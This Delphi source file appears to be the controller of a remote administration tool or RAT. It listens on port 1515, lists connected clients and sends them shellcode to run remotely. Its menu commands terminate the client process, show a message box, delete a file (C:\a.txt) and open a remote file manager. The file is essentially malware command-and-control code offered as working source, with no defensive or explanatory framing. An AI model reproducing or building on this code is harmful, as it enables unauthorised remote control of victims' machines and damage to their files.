unit untMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, untServerSocket, untFilemanager;

type
  TForm1 = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    SendShellcode1: TMenuItem;
    CloseServer1: TMenuItem;
    MessageBox1: TMenuItem;
    DeleteFile1: TMenuItem;
    Filemanager1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure CloseServer1Click(Sender: TObject);
    procedure MessageBox1Click(Sender: TObject);
    procedure DeleteFile1Click(Sender: TObject);
    procedure Filemanager1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  mySocketThread:TMyThread;

implementation

{$R *.dfm}
uses untClientController, untUtils, untSHMessageBox, untSHDeleteFile, untSHExitProcess;



procedure TForm1.FormCreate(Sender: TObject);
begin
  mySocketThread := TMyThread.Create(True);
  mySocketThread.ListenPort := 1515;
  mySocketThread.Resume;
end;

procedure TForm1.CloseServer1Click(Sender: TObject);
var
  mTempThread:TClientThread;
  pFunction:Pointer;
  dwFunction:Cardinal;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        mTempThread := TClientThread(SubItems.Objects[0]);
        pFunction := prepShellCodeWithParams(@pExitProcess, nil, (DWORD(@pExitProcess_END) - DWORD(@pExitProcess)), 0, dwFunction);
        if pFunction <> nil then
        begin
          SendBuffer(mTempThread.mySocket, 0, pFunction, dwFunction+1);
          FreeMem(pFunction);
        end;
      end;
    end;
  end;
end;

procedure TForm1.MessageBox1Click(Sender: TObject);
var
  mTempThread:TClientThread;
  pFunction:Pointer;
  dwFunction:Cardinal;
  strData:String;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        strData := 'HELO WHAT UP?';
        mTempThread := TClientThread(SubItems.Objects[0]);
        pFunction := prepShellCodeWithParams(@pMessageBox, @strData[1], (DWORD(@untSHMessageBox.pMessageBox_END) - DWORD(@untSHMessageBox.pMessageBox)), Length(strData) + 1,dwFunction);
        if pFunction <> nil then
        begin
          SendBuffer(mTempThread.mySocket, 0, pFunction, dwFunction+1);
          FreeMem(pFunction);
        end;
      end;
    end;
  end;
end;

procedure TForm1.DeleteFile1Click(Sender: TObject);
var
  mTempThread:TClientThread;
  pFunction:Pointer;
  dwFunction:Cardinal;
  strData:String;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        mTempThread := TClientThread(SubItems.Objects[0]);
        strData := 'C:\a.txt';
        pFunction := prepShellCodeWithParams(@pDeleteFile, @strData[1], (DWORD(@pDeleteFile_END) - DWORD(@pDeleteFile)), Length(strData) + 1,dwFunction);
        if pFunction <> nil then
        begin
          SendBuffer(mTempThread.mySocket, 0, pFunction, dwFunction+1);
          FreeMem(pFunction);
        end;
      end;
    end;
  end;
end;

procedure TForm1.Filemanager1Click(Sender: TObject);
var
  mTempThread:TClientThread;
  pFunction:Pointer;
  dwFunction:Cardinal;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        mTempThread := TClientThread(SubItems.Objects[0]);
        if not Assigned(mTempThread.GUI.frmFilemanager) then
        begin
          mTempThread.GUI.frmFilemanager := TForm2.Create(nil);
          mTempThread.GUI.frmFilemanager.SetForm(mTempThread.mySocket);
        end;
        mTempThread.GUI.frmFilemanager.Show;
      end;
    end;
  end;
end;

end.
